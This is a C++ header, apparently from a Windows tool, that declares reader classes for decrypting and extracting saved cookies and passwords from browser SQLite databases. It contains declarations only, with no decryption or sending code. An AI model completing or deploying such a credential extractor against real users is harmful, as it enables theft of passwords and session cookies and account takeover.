#pragma once
#include<iostream>
#include<windows.h>
#include<vector>
#include<string>

#include<sqlite3.h>
#include "../decrypt/decrypt.h"

using std::vector;
using std::string;

struct CookieEntry {
	string name;
	string site;
	string path;
	string cookie;
};

struct PasswordEntry {
	string name;
	string site;
	string password;
};


class ContentReader {
public:
	LPCSTR filePath;
	sqlite3* database;
	sqlite3_stmt* statement;

	PBYTE key;

	ContentReader(LPCSTR filePath, PBYTE key) : filePath(filePath), key(key), database(NULL), statement(NULL) {};
	~ContentReader();

	BOOL isLocked();
	BOOL initSqliteDb();
	BOOL prepare(LPCSTR statement);
	BOOL step();

	LPCSTR getText(int colIndex);
	int getInt(int colIndex);
	int getBytes(int colIndex);

	template <typename T>
	T getBlob(int colIndex) {
		return (T)sqlite3_column_blob(this->statement, colIndex);
	}

};

class CookieReader : public ContentReader {
public:
	vector<CookieEntry*> cookies;
	void populateCookies();

	using ContentReader::ContentReader;
	~CookieReader();
};

class PasswordReader : public ContentReader {
public:
	vector<PasswordEntry*> passwords;
	void populatePasswords();

	using ContentReader::ContentReader;
	~PasswordReader();
};